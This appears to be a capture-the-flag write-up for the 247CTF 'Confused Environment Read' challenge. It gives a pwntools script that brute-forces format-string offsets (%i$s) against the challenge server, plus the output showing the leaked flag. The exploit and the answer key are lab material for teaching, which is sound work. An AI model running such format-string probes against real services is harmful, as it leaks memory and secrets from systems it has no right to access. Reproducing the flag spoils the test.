# CONFUSED ENVIRONMENT READ [EASY]

## Description

> Can you abuse our confused environment service to read flag data hidden in an environment variable?

No source code.

## Short Solution Description / Tags

Format String Attack

## Solution

solver.py

```python
from pwn import *

context.log_level = "ERROR"
context.terminal = ["tmux", "split-window", "-h"]


def conn() -> pwnlib.tubes:
    io = remote("aae92961f50ec18f.247ctf.com", 50216)
    return io


def main():
    for i in range(1, 200):
        print(i, end="\r", flush=True)
        try:
            with conn() as io:
                payload = f"%{i}$s".encode()
                io.sendlineafter(b"What's your name again?", payload)

                io.recv()
                recv = io.recvS()

                if "247" in recv:
                    print()
                    print(recv)
                    return

        except KeyboardInterrupt:
            return

        except:
            pass

    # io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py

Oh, that's right! Welcome back FLAG=247CTF{171291337b2b0283cdbd1db63263cc78}!
Argh, I can't see who you are!
What's your name again?
```
